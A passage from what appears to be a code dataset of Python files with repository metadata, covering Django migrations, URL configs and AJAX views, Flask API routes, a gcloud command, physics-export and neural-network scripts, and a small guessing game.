sval != tval:\n                        errs.add('val')\n                        metadata.add('value')\n                else:\n                    tmeta = all_abs2meta_in[tgt]\n                    tunits = tmeta['units'] if 'units' in tmeta else None\n                    if 'units' not in gmeta and sunits != tunits:\n\n                        # Detect if either Source or Targe units are None.\n                        if sunits is None or tunits is None:\n                            errs.add('units')\n                            metadata.add('units')\n\n                        elif _find_unit(sunits) != _find_unit(tunits):\n                            errs.add('units')\n                            metadata.add('units')\n\n                    if 'value' not in gmeta:\n                        if tval.shape == sval.shape:\n                            if _has_val_mismatch(tunits, tval, sunits, sval):\n                                errs.add('val')\n                                metadata.add('value')\n                        else:\n                            if all_abs2meta_in[tgt]['has_src_indices'] and tgt in abs2meta_in:\n                                s = sval.ravel() if abs2meta_in[tgt]['flat_src_indices'] else sval\n                                srcpart = s[abs2meta_in[tgt]['src_indices']]\n                                if _has_val_mismatch(tunits, tval, sunits, srcpart):\n                                    errs.add('val')\n                                    metadata.add('value')\n\n            if errs:\n                self._show_ambiguity_msg(prom, errs, tgts, metadata)\n            elif src not in all_discrete_outs:\n                gmeta['units'] = sunits\n\n    def _show_ambiguity_msg(self, prom, metavars, tgts, metadata=None):\n        errs = sorted(metavars)\n        if metadata is None:\n            meta = errs\n        else:\n            meta = sorted(metadata)\n        inputs = sorted(tgts)\n        gpath = common_subpath(tgts)\n        if gpath == self.pathname:\n            g = self\n        else:\n            g = self._get_subsystem(gpath)\n        gprom = None\n\n        # get promoted name relative to g\n        if MPI is not None and self.comm.size > 1:\n            if g is not None and not g._is_local:\n                g = None\n            if self.comm.allreduce(int(g is not None)) < self.comm.size:\n                # some procs have remote g\n                if g is not None:\n                    gprom = g._var_allprocs_abs2prom['input'][inputs[0]]\n                proms = self.comm.allgather(gprom)\n                for p in proms:\n                    if p is not None:\n                        gprom = p\n                        break\n        if gprom is None:\n            gprom = g._var_allprocs_abs2prom['input'][inputs[0]]\n\n        gname = f\"Group named '{gpath}'\" if gpath else 'model'\n        args = ', '.join([f'{n}=?' for n in errs])\n        conditional_error(f\"{self.msginfo}: The following inputs, {inputs}, promoted \"\n                          f\"to '{prom}', are connected but their metadata entries {meta}\"\n                          f\" differ. Call <group>.set_input_defaults('{gprom}', {args}), \"\n                          f\"where <group> is the {gname} to remove the ambiguity.\")\n"}
{"blob_id": "a9e614896cb3b64b0341964d3833ea2a45658952", "directory_id": "86541e6a9463a0de1d1b102426c73bc731b30349", "path": "/comment/migrations/0003_auto_20180421_1438.py", "content_id": "cd0e4b19726dff5c02b5d814048bba0919652095", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "smapotato/MyBlog", "snapshot_id": "f1cc3148f19b19ba4f5f4437b90cffd8b0ddbe91", "revision_id": "ff058c5c5d067437d2e2799a44aae0bf17ff22ba", "branch_name": "refs/heads/master", "visit_date": "2020-03-18 17:26:28.626358", "revision_date": "2018-05-27 09:07:12", "committer_date": "2018-05-27 09:07:12", "github_id": "135029369", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "592", "extension": "py", "content": "# Generated by Django 2.0.3 on 2018-04-21 06:38\n\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('comment', '0002_auto_20180421_1434'),\n    ]\n\n    operations = [\n        migrations.RemoveField(\n            model_name='comment',\n            name='parent_id',\n        ),\n        migrations.AddField(\n            model_name='comment',\n            name='parent',\n            field=models.ForeignKey(null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='comment.Comment'),\n        ),\n    ]\n"}
{"blob_id": "f2f95abfa48576405b22de0fe042f561eb265d28", "directory_id": "c8453f83242cd525a98606f665d9f5d9e84c6335", "path": "/lib/surface/container/images/list_tags.py", "content_id": "31d68c01369d00dbd98fec0fd6289bf87e7c0617", "detected_licenses": "['LicenseRef-scancode-unknown-license-reference', 'Apache-2.0']", "license_type": "permissive", "repo_name": "paulfoley/GCP-Cloud_SDK", "snapshot_id": "5188a04d8d80a2709fa3dba799802d57c7eb66a1", "revision_id": "bec7106686e99257cb91a50f2c1b1a374a4fc66f", "branch_name": "refs/heads/master", "visit_date": "2021-06-02 09:49:48.309328", "revision_date": "2017-07-02 18:26:47", "committer_date": "2017-07-02 18:26:47", "github_id": "96041222", "star_events_count": "1", "fork_events_count": "1", "gha_license_id": "NOASSERTION", "gha_event_created_at": "2020-07-26 22:40:49", "gha_created_at": "2017-07-02 18:19:52", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3412", "extension": "py", "content": "# Copyright 2016 Google Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"List tags command.\"\"\"\n\nimport argparse\n\nfrom containerregistry.client.v2_2 import docker_http\nfrom containerregistry.client.v2_2 import docker_image\nfrom googlecloudsdk.api_lib.container.images import util\nfrom googlecloudsdk.calliope import base\nfrom googlecloudsdk.core import http\n\n# Add to this as we add columns.\n_DEFAULT_KINDS = [\n    'BUILD_DETAILS',\n    'IMAGE_BASIS',\n    'PACKAGE_VULNERABILITY',\n]\n\n\nclass ListTags(base.ListCommand):\n  \"\"\"List tags and digests for the specified image.\"\"\"\n\n  detailed_help = {\n      'DESCRIPTION':\n          \"\"\"\\\n          The container images list-tags command of gcloud lists metadata about\n          tags and digests for the specified container image. Images must be\n          hosted by the Google Container Registry.\n      \"\"\",\n      'EXAMPLES':\n          \"\"\"\\\n          List the tags in a specified image:\n\n            $ {{command}} gcr.io/myproject/myimage\n\n      \"\"\",\n  }\n\n  def Collection(self):\n    return 'container.tags'\n\n  @staticmethod\n  def Args(parser):\n    \"\"\"Register flags for this command.\n\n    Args:\n      parser: An argparse.ArgumentParser-like object. It is mocked out in order\n          to capture some information, but behaves like an ArgumentParser.\n    \"\"\"\n    parser.add_argument(\n        '--show-occurrences',\n        action='store_true',\n        default=False,\n        help=argparse.SUPPRESS)\n    parser.add_argument(\n        '--occurrence-filter',\n        default=' OR '.join(\n            ['kind = \"{kind}\"'.format(kind=x) for x in _DEFAULT_KINDS]),\n        help=argparse.SUPPRESS)\n    parser.add_argument(\n        'image',\n        help='The name of the image. Format: *.gcr.io/repository/image')\n\n    # Does nothing for us, included in base.ListCommand\n    base.URI_FLAG.RemoveFromParser(parser)\n\n  def Run(self, args):\n    \"\"\"This is what gets called when the user runs this command.\n\n    Args:\n      args: an argparse namespace. All the arguments that were provided to this\n        command invocation.\n\n    Raises:\n      InvalidImageNameError: If the user specified an invalid image name.\n    Returns:\n      Some value that we want to have printed later.\n    \"\"\"\n\n    repository = util.ValidateRepositoryPath(args.image)\n    http_obj = http.Http()\n    with docker_image.FromRegistry(\n        basic_creds=util.CredentialProvider(),\n        name=repository,\n        transport=http_obj) as image:\n      try:\n        return util.TransformManifests(\n            image.manifests(),\n            repository,\n            show_occurrences=args.show_occurrences,\n            occurrence_filter=args.occurrence_filter)\n      except docker_http.V2DiagnosticException as err:\n        raise util.GcloudifyRecoverableV2Errors(err, {\n            403: 'Access denied: {0}'.format(repository),\n            404: 'Not found: {0}'.format(repository)\n        })\n"}
{"blob_id": "0df74923ac7e94e5729d5c2c8bc6145c8c490d6b", "directory_id": "c2d05815acc659bbdb2d35fa063716effa268b53", "path": "/reptilia/app/routes/list.py", "content_id": "7fcc941fdfef4c029301ba428a5bd98295b11b30", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "enlacee/reptilia", "snapshot_id": "09f5c4fc7332ea735ed51f29e735662e501a492d", "revision_id": "a9e44f180b90e5ffd30758152b8866726b3a94ed", "branch_name": "refs/heads/master", "visit_date": "2023-01-08 06:57:14.915982", "revision_date": "2020-10-31 00:36:53", "committer_date": "2020-10-31 00:36:53", "github_id": "308772742", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2020-10-31 00:36:54", "gha_created_at": "2020-10-31 00:24:13", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2092", "extension": "py", "content": "from flask import jsonify, request\nfrom flask_jwt_extended import jwt_required\n\nfrom app.routes import api\nfrom app.models.List import List\nfrom app.models.Campaign import Campaign\nfrom app.utils.handlers import exception_handler\n\n@api.route('/campaigns', methods= ['POST'])\n@jwt_required\n@exception_handler\ndef campaigns():\n    data = {\n        'status': True\n    }\n    with Campaign() as campaign:\n        data['campaigns'] = campaign.get_all()\n\n    return jsonify(data)\n\n\n@api.route('/update-campaign-status', methods= ['POST'])\n@jwt_required\n@exception_handler\ndef update_campaign_status():\n    data = {\n        'status': True\n    }\n\n    campaign_id = request.json.get('campaign_id')\n    status = request.json.get('status')\n\n    with Campaign() as _campaign:\n        _campaign.update_status(campaign_id, status)\n\n    return jsonify(data)\n\n@api.route('/lists', methods= ['POST'])\n@jwt_required\n@exception_handler\ndef list_ids():\n    data = {\n        'status': True\n    }\n\n    with List() as _list:\n        rows = _list.get_actives()\n\n    if rows:\n        data['lists'] = rows\n\n    return jsonify(data)\n\n\n@api.route('/all-lists', methods= ['POST'])\n@jwt_required\n@exception_handler\ndef all_lists():\n    data = {\n        'status': True\n    }\n\n    with List() as _list:\n        rows = _list.get_all()\n\n    if rows:\n        data['lists'] = rows\n\n    return jsonify(data)\n\n@api.route('/create-list', methods= ['POST'])\n@jwt_required\n@exception_handler\ndef create_list():\n    data = {\n        'status': True\n    }\n\n    list_id = request.json.get('list_id')\n    list_name = request.json.get('list_name')\n    campaign_id = request.json.get('campaign_id')\n\n    with List() as _list:\n        _list.add(list_id, list_name, campaign_id)\n\n    return jsonify(data)\n\n\n@api.route('/update-list-status', methods= ['POST'])\n@jwt_required\n@exception_handler\ndef update_list_status():\n    data = {\n        'status': True\n    }\n\n    list_id = request.json.get('list_id')\n    status = request.json.get('status')\n\n    with List() as _list:\n        _list.update_status(list_id, status)\n\n    return jsonify(data)\n\n"}
{"blob_id": "494cd7ec80a546f31f87234f517f4ef6beb7a82e", "directory_id": "e1332154a4dd0f427c703141b8228eb70ef7a303", "path": "/quotespage/views/ajax_handlers.py", "content_id": "e7f885e5f06856d6cdc219f3fb975db9e688ea2b", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Cornell-CIS-Slack/cs-quotes", "snapshot_id": "3207664128f82014e707b6d30592afaaebebf70c", "revision_id": "a4451ff0703acebb762641cbc236cc0e51e2d2fd", "branch_name": "refs/heads/master", "visit_date": "2023-08-23 03:27:55.679178", "revision_date": "2021-10-28 20:03:33", "committer_date": "2021-10-28 20:03:33", "github_id": "45124261", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2913", "extension": "py", "content": "from django.http import HttpResponse, Http404\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.core.exceptions import PermissionDenied\nfrom django.utils.html import strip_tags, escape\nfrom quotespage.models import Quote, ApiUser\nimport datetime\nimport random\nimport json\n\ndef vote(request):\n\t\"\"\"Handles AJAX requests to add an upvote or downvote for a quote.\"\"\"\n\tif request.method != 'POST':\n\t\traise Http404(\"This page cannot be viewed.\")\n\tquoteid = int(request.POST['id'])\n\tupvote = (request.POST['upvote'].lower() == \"true\")\n\tresp_dict = {}\n\ttry:\n\t\tquote = Quote.objects.get(id=quoteid)\n\t\tquote.votes = (quote.votes + 1 if upvote else quote.votes - 1)\n\t\tquote.save()\n\t\tresp_dict['success'] = True\n\t\tresp_dict['new_count'] = quote.votes\n\texcept Quote.DoesNotExist:\n\t\tresp_dict['success']=False\n\n\treturn HttpResponse(json.dumps(resp_dict), content_type=\"application/javascript\")\n\ndef generate_api_key(request):\n\t\"\"\"Handles AJAX requests for a new API key.\"\"\"\n\tnew_key = ApiUser.objects.get_unique_key()\n\treturn HttpResponse(json.dumps({'token' : new_key}), content_type=\"application/javascript\")\n\n@csrf_exempt\ndef remote_submit(request):\n\tif request.method != 'POST':\n\t\traise Http404(\"This page cannot be viewed.\")\n\tif not 'HTTP_TOKEN' in request.META:\n\t\traise PermissionDenied\n\ttoken = request.META['HTTP_TOKEN']\n\tif not ApiUser.objects.filter(api_key=token).exists():\n\t\traise PermissionDenied(\"Invalid API key\")\n\tif ApiUser.objects.get(api_key=token).key_expires < datetime.date.today():\n\t\traise PermissionDenied(\"Expired API key\")\n\tnew_quote = Quote(\n\t\t\tspeaker = request.POST['speaker'],\n\t\t\tspeaker_class = Quote.GRAD_STUDENT,\n\t\t\tdate = datetime.date.today(),\n\t\t\tquotation = escape(strip_tags(request.POST['quotation'])),\n\t\t\tcontext = escape(strip_tags(request.POST['context']))\n\t)\n\tnew_quote.save()\n\treturn HttpResponse(status=201)\n\ndef json_random_quote(request):\n\t\"\"\"Handles AJAX requests for a random quote.\"\"\"\n\tquotes = Quote.objects.filter(approved=True)\n\tif 'speaker' in request.GET:\n\t\tquotes = quotes.filter(speaker=request.GET['speaker'])\n\tif 'year' in request.GET:\n\t\tquotes = quotes.filter(date__year=int(request.GET['year']))\n\tif 'month' in request.GET:\n\t\tquotes = quotes.filter(date__month=int(request.GET['month']))\n\tif 'day' in request.GET:\n\t\tquotes = quotes.filter(date__day=int(request.GET['day']))\n\tif quotes.count() == 0:\n\t\treturn HttpResponse(\"\", content_type=\"text/text\")\n\trand_index = random.randint(0,quotes.count()-1)\n\tquote = quotes[rand_index]\n\treturn HttpResponse(json.dumps(quote.get_fields_dict(), default=json_patch), content_type=\"application/javascript\")\n\n\ndef json_patch(obj):\n\t\"\"\"Patches the gaping hole in json.dumps by allowing it to serialize Python Datetimes\"\"\"\n\tif isinstance(obj, datetime.datetime) \\\n\t\t\tor isinstance(obj, datetime.date) \\\n\t\t\tor isinstance(obj, datetime.time):\n\t\treturn obj.isoformat()\n\traise TypeError(\"Unknown non-serializable type\")\n\n"}
{"blob_id": "8cd41ee8c833fb7d76ec5d6fcc4ef5a36db55050", "directory_id": "a5a7c59b04a1a64fe34653c7970c3cf173f9c1df", "path": "/io/swig/io/gnuplot_export.py", "content_id": "a8504306a3b7c530dfb745634aee77975fbd973d", "detected_licenses": "['Apache-2.0', 'LicenseRef-scancode-unknown-license-reference']", "license_type": "permissive", "repo_name": "siconos/siconos", "snapshot_id": "a7afdba41a2bc1192ad8dcd93ac7266fa281f4cf", "revision_id": "82a8d1338bfc1be0d36b5e8a9f40c1ad5384a641", "branch_name": "refs/heads/master", "visit_date": "2023-08-21 22:22:55.625941", "revision_date": "2023-07-17 13:07:32", "committer_date": "2023-07-17 13:07:32", "github_id": "37709357", "star_events_count": "166", "fork_events_count": "33", "gha_license_id": "Apache-2.0", "gha_event_created_at": "2023-07-17 12:31:16", "gha_created_at": "2015-06-19 07:55:53", "gha_language": "C", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3345", "extension": "py", "content": "import os,sys\nimport h5py\nimport numpy\n\nfilename = '{0}.hdf5'.format(os.path.splitext(os.path.basename(sys.argv[1]))[0])\n\nwithPlot=False\n\n\nprint filename\nout= h5py.File(filename, 'r')\ndef group(h, name):\n    try:\n        return h[name]\n    except KeyError:\n        return h.create_group(name)\n\ndef data(h, name, nbcolumns):\n    try:\n        return h[name]\n    except KeyError:\n        return h.create_dataset(name, (0, nbcolumns),\n                                maxshape=(None, nbcolumns))\n\n    \n_data = group(out, 'data')\nref = group(_data, 'ref')\njoints = group(_data, 'joints')\nstatic_data = data(_data, 'static', 9)\nvelocities_data = data(_data, 'velocities', 8)\ndynamic_data = data(_data, 'dynamic', 9)\ncf_data = data(_data, 'cf', 15)\nsolv_data = data(_data, 'solv', 4)\ninput = group(_data, 'input')\nnslaws = group(_data, 'nslaws')\n\ndpos_data = dynamic_data\nmax_time = max(dpos_data[:, 0])\ntimes = list(set(dpos_data[:, 0]))\ntimes.sort()\nndyna = len(numpy.where(dpos_data[:, 0] == times[0]))\nntime=len(times)\n\n\nprint('time range :', times[0], times[-1])\nprint('ndyna :', ndyna)\nprint('ntime:', ntime)\ninstances = set(dpos_data[:, 1])\n\n#output_dict = {}\n\n#output_dict[1]= [1,2,3]\n\n\n######## position output ########\n\nnvalue = ndyna*7+1\n\nposition_output = numpy.empty((ntime,nvalue))\n#print('position_output shape', numpy.shape(position_output))\nposition_output[:,0] = times[:]\nfor t in range(len(times)):\n    for i in range(ndyna):\n        position_output[t,1+i*7:1+(1+i)*7] = dpos_data[t*ndyna+ndyna, 2:9]\n#print('position_output', position_output)\nfilename_output = '{0}_position.dat'.format(os.path.splitext(os.path.basename(sys.argv[1]))[0])\nprint('output file:', filename_output)\nnumpy.savetxt(filename_output, position_output)\n\n######## position output ########\nnvalue = ndyna*6+1\n\nvelocity_output = numpy.empty((ntime,nvalue))\n#print('position_output shape', numpy.shape(position_output))\nvelocity_output[:,0] = times[:]\nfor t in range(len(times)):\n    for i in range(ndyna):\n        velocity_output[t,1+i*6:1+(1+i)*6] = velocities_data[t*ndyna+ndyna, 2:8]\n#print('position_output', position_output)\nfilename_output = '{0}_velocity.dat'.format(os.path.splitext(os.path.basename(sys.argv[1]))[0])\nprint('output file:', filename_output)\nnumpy.savetxt(filename_output, velocity_output)\n\n\n\nif withPlot:\n    import matplotlib\n    havedisplay = \"DISPLAY\" in os.environ\n    if not havedisplay:\n        matplotlib.use('Agg')\n\n    import matplotlib.pyplot as plt\n\n    plt.subplot(411)\n    plt.title('position x')\n    plt.plot(position_output[:, 0], position_output[:, 1])\n    plt.subplot(412)\n    plt.title('position y')\n    plt.plot(position_output[:, 0], position_output[:, 2])\n    plt.subplot(413)\n    plt.title('position z ')\n    plt.plot(position_output[:, 0], position_output[:, 3])\n\n\n    plt.figure()\n    plt.subplot(411)\n    plt.title('orientation q0')\n    plt.plot(position_output[:, 0], position_output[:, 4])\n    plt.subplot(412)\n    plt.title('orientation q1')\n    plt.plot(position_output[:, 0], position_output[:, 5])\n    plt.subplot(413)\n    plt.title('orientation q2 ')\n    plt.plot(position_output[:, 0], position_output[:, 6])\n    plt.subplot(414)\n    plt.title('orientation q3 ')\n    plt.plot(position_output[:, 0], position_output[:, 7])\n\n\n\n    if havedisplay:\n        plt.show()\n    else:\n        plt.savefig(\"bbts.png\")\n"}
{"blob_id": "6c6ebe0911535c9c8eaa82f0389bd4631f1ac787", "directory_id": "540f54c30ac818988b524868bebe40e8b3df606e", "path": "/models/neck/ssd_neck.py", "content_id": "defaa58139709dc87c70baf81100d85fce8ecf4a", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "scott-mao/MutualGuide", "snapshot_id": "c8c0aad7eecad0e0bbea2af87baf69c9bd0844ce", "revision_id": "59de81ca152b80c68979d0c1b54e0b73a992c303", "branch_name": "refs/heads/master", "visit_date": "2023-03-21 17:40:50.018092", "revision_date": "2021-03-13 14:58:52", "committer_date": "2021-03-13 14:58:52", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1363", "extension": "py", "content": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\nimport os\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom models.base_blocks import BasicConv\n\n\ndef feature_transform_module(channels, fea_channel):\n    layers = []\n    for (i, channel) in enumerate(channels):\n        layers.append(BasicConv(channel, fea_channel, kernel_size=1, padding=0, scale_factor=2 ** i))\n    return nn.ModuleList(layers)\n\n\ndef fpn_feature_extractor(channels, fpn_level, fea_channel):\n    layers = [BasicConv(fea_channel * len(channels), fea_channel, kernel_size=3, stride=1, padding=1)]\n    for _ in range(fpn_level - 1):\n        layers.append(BasicConv(fea_channel, fea_channel, kernel_size=3, stride=2, padding=1))\n    return nn.ModuleList(layers)\n\n\nclass SSDNeck(nn.Module):\n\n    def __init__(self, fpn_level, channels, fea_channel):\n        super(SSDNeck, self).__init__()\n        self.ft_module = feature_transform_module(channels, fea_channel)\n        self.pyramid_ext = fpn_feature_extractor(channels, fpn_level, fea_channel)\n\n    def forward(self, x):\n        transformed_features = list()\n        for (k, v) in zip(x, self.ft_module):\n            transformed_features.append(v(k))\n        x = torch.cat(transformed_features, 1)\n\n        fpn_fea = list()\n        for v in self.pyramid_ext:\n            x = v(x)\n            fpn_fea.append(x)\n        return fpn_fea\n\n"}
{"blob_id": "eb100eed015d6d6c69d5645791a5c9cc4b19b5cd", "directory_id": "6114a1313ca1193343fac049d0f3cf9e15438829", "path": "/Chap0/project/guess.py", "content_id": "d1d399e95d5685e53d126aa80a8656a4ac77bad9", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "AIHackerTest/Hansoluo_Py101-004", "snapshot_id": "0d49bb12158d2d6f8c430c407d739336de7d0ef3", "revision_id": "1bb2d1810ec286e16cf12165e75472edd7c5d29a", "branch_name": "refs/heads/master", "visit_date": "2021-06-28 01:54:57.478192", "revision_date": "2017-09-12 08:23:02", "committer_date": "2017-09-12 08:23:02", "github_id": "103240275", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "648", "extension": "py", "content": "# -*- coding: utf-8 -*-\n\n# \u529f\u80fd\u63cf\u8ff0\n# \u7a0b\u5e8f\u968f\u673a\u751f\u6210\u4e00\u4e2a20\u4ee5\u5185\u7684\u6570\u5b57\uff0c\u7528\u6237\u670910\u6b21\u673a\u4f1a\u731c\u6d4b\n# \u7a0b\u5e8f\u6839\u636e\u7528\u6237\u8f93\u5165\uff0c\u7ed9\u4e88\u4e00\u5b9a\u63d0\u793a\uff08\u5927\u4e86\uff0c\u5c0f\u4e86\uff0c\u6b63\u786e\uff09\n# \u731c\u5bf9\u6216\u7528\u5b8c10\u6b21\u673a\u4f1a\uff0c\u6e38\u620f\u7ed3\u675f\n\nimport random\n\n# random.randint(a, b)\uff1aReturn a random integer N such that a <= N <= b\na = random.randint(1,20)\n \nfor i in range(1,11):\n    b = int(input(\"\u8bf7\u731c\u6d4b20\u4ee5\u5185\u7684\u6570\u5b57\uff1a\"))\n    if a > b:\n        print(\"\u5c0f\u4e86\")\n    elif a < b:\n        print(\"\u5927\u4e86\")\n    else:\n        print(\"\u6b63\u786e\")\n        break\n    \n    print(\"\u4f60\u8fd8\u6709 {0} \u6b21\u673a\u4f1a\".format(10-i))\n    i += 1\n\nprint ('\u6e38\u620f\u7ed3\u675f')\n\n    \n\n"}
{"blob_id": "0ed2f6c7c8ca1dc78db9c05e4e5ca005bb389f3d", "directory_id": "76a61fa52ab282501992ac889665bce01f2cdd62", "path": "/examples/REINFORCE/linear.py", "content_id": "7fb7f97d19853cd61fb1e43f6ee1644fbdf43297", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "diogo149/treeano", "snapshot_id": "35ae0f9d0c0bbcb9ca1ff8856ba527e2d19b6194", "revision_id": "9b3fd6bb5eb2f6738c9e5c357e70bef95dcae7b7", "branch_name": "refs/heads/master", "visit_date": "2020-04-06 07:05:19.946985", "revision_date": "2016-08-11 15:47:58", "committer_date": "2016-08-11 15:47:58", "github_id": "34579507", "star_events_count": "45", "fork_events_count": "13", "gha_license_id": "None", "gha_event_created_at": "2016-02-03 07:32:45", "gha_created_at": "2015-04-25 17:58:17", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2456", "extension": "py", "content": "from __future__ import division, absolute_import\nfrom __future__ import print_function, unicode_literals\n\nimport numpy as np\nimport theano\nimport theano.tensor as T\nimport treeano\nimport treeano.nodes as tn\nfrom treeano.sandbox.nodes import REINFORCE\n\nfX = theano.config.floatX\n\n\nTARGET_WEIGHT = np.random.randn(10, 2).astype(fX)\nTARGET_BIAS = np.random.randn(2).astype(fX)\n\n\nclass RewardNode(treeano.NodeImpl):\n\n    input_keys = (\"state\", \"sampled\")\n\n    def compute_output(self, network, state_vw, sampled_vw):\n        W = T.constant(TARGET_WEIGHT)\n        b = T.constant(TARGET_BIAS)\n        target = T.dot(state_vw.variable, W) + b.dimshuffle(\"x\", 0)\n        reward = -T.sqr(sampled_vw.variable - target).sum(axis=1)\n        network.create_vw(\n            \"raw_reward\",\n            variable=T.mean(reward),\n            shape=(),\n        )\n        baseline_reward = 100\n        network.create_vw(\n            \"default\",\n            variable=reward + baseline_reward,\n            shape=(state_vw.shape[0],),\n            tags={\"output\"},\n        )\n\n\nBATCH_SIZE = 64\ngraph = tn.GraphNode(\n    \"graph\",\n    [[tn.InputNode(\"state\", shape=(BATCH_SIZE, 10)),\n      tn.DenseNode(\"mu\", num_units=2),\n      tn.ConstantNode(\"sigma\", value=1.),\n      REINFORCE.NormalSampleNode(\"sampled\"),\n      RewardNode(\"reward\"),\n      REINFORCE.NormalREINFORCECostNode(\"REINFORCE\")],\n     [{\"from\": \"state\", \"to\": \"mu\"},\n      {\"from\": \"mu\", \"to\": \"sampled\", \"to_key\": \"mu\"},\n      {\"from\": \"sigma\", \"to\": \"sampled\", \"to_key\": \"sigma\"},\n      {\"from\": \"sampled\", \"to\": \"reward\", \"to_key\": \"sampled\"},\n      {\"from\": \"state\", \"to\": \"reward\", \"to_key\": \"state\"},\n      {\"from\": \"state\", \"to\": \"REINFORCE\", \"to_key\": \"state\"},\n      {\"from\": \"mu\", \"to\": \"REINFORCE\", \"to_key\": \"mu\"},\n      {\"from\": \"sigma\", \"to\": \"REINFORCE\", \"to_key\": \"sigma\"},\n      {\"from\": \"reward\", \"to\": \"REINFORCE\", \"to_key\": \"reward\"},\n      {\"from\": \"sampled\", \"to\": \"REINFORCE\", \"to_key\": \"sampled\"},\n      {\"from\": \"REINFORCE\"}]]\n)\n\nnetwork = tn.AdamNode(\n    \"adam\",\n    {\"subtree\": graph,\n     \"cost\": tn.ReferenceNode(\"cost\", reference=\"REINFORCE\")},\n    learning_rate=0.1\n).network()\nfn = network.function(\n    [\"state\"], [(\"reward\", \"raw_reward\")], include_updates=True)\n\nerrors = []\nfor i in range(5000):\n    error, = fn(np.random.randn(BATCH_SIZE, 10).astype(fX))\n    if i % 100 == 0:\n        print(\"Iter:\", i, \"Error:\", error)\n    errors.append(error)\n\nprint(\"mean reward:\", np.mean(errors))\n"}
{"blob_id": "29939ebbf56f63d2867cb0512b96e4c8e6c9f43a", "directory_id": "9d87e25fa27242088a301ddda4271e66b145f19b", "path": "/financeiro/urls.py", "content_id": "081cb4b5360aa6722185b18b4fed9e07ca691a2b", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "gabrielvboas/risco", "snapshot_id": "825b9c7b65a06ce44e24da90c060111c2222e545", "revision_id": "c456b00aa6e99ca60a0bac5fdc93d7278ee4d0c9", "branch_name": "refs/heads/master", "visit_date": "2020-06-05 20:28:17.249919", "revision_date": "2015-04-15 20:51:34", "committer_date": "2015-04-15 20:51:34", "github_id": "32881740", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "2015-04-11 01:02:30", "gha_created_at": "2015-03-25 18:01:03", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1629", "extension": "py", "content": "from django.conf.urls import patterns, include, url\nfrom financeiro import views\nfrom django.views.generic import list, detail\nfrom financeiro.models import Fornecedor, ContaAPagar, Conta, Relatorio\n\n\nurlpatterns = patterns('',\n    url(r'^$', views.PaginaInicial.as_view(), name='initial'),\n    url(r'^cadastroconta/', views.CadastroContaAPagar.as_view(), name='criar_conta_pagar'),\n    url(r'^listacontapagar', list.ListView.as_view(model=ContaAPagar), name='lista_conta_pagar'),\n    url(r'^editconta/(?P<pk>\\d+)/$', views.EditarContaAPagar.as_view(), name='edita_conta_pagar'),\n    url(r'^itensconta/(?P<pk>\\d+)/$', views.ItensContaAPagar.as_view(), name='itens_conta'),\n    url(r'^finalizeconta/(?P<pk>\\d+)/$', views.ConcluirConta.as_view(), name='concluir_conta'),\n    url(r'^cadastrofornecedor/$', views.CadastroFornecedor.as_view(), name='criar_fornecedor'),\n    url(r'^listafornecedor/$', list.ListView.as_view(model=Fornecedor), name='lista_fornecedor'),\n    url(r'^editafornecedor/(?P<pk>\\d+)/$', views.EditarFornecedor.as_view(), name='edita_fornecedor'),\n    url(r'^deletafornecedor/(?P<pk>\\d+)/$', views.DeletarFornecedor.as_view(), name='deleta_fornecedor'),\n    url(r'^requisicaoRelatorio/', views.RequisicaoRelatorio.as_view(), name='requisicao_relatorio'),\n    url(r'^relatorio/$', list.ListView.as_view(model=Relatorio), name='mostra_relatorio'),\n    url(r'^json/(?P<tipo>\\w{0,50})/$', views.json, name='json'),\n    url(r'^teste/', views.postteste.as_view(), name='postteste'),\n    url(r'^atualiza/', views.teste, name='atualiza'),\n    #url(r'^cliente/(?P<pk>\\d+)/$', detail.DetailView.as_view(model=Cliente))\n)\n"}
